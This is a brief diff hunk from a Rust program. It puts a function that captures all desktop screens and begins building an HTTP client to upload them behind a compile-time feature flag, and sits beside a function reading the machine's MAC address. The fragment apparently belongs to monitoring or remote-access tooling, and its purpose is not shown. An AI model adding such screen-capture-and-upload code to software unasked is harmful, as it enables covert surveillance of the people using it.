@@ -41,7 +41,7 @@ pub fn get_mac() -> String {
 }
 
 pub async fn screenshot_desktop_and_upload() -> Result<Vec<String>, Box<dyn std::error::Error>> {
-        println!("triggered desktop ss");
+    if cfg!(feature = "desktop_screenshot") {
         let screens = Screen::all()?;
 
         let client = reqwest::Client::builder()
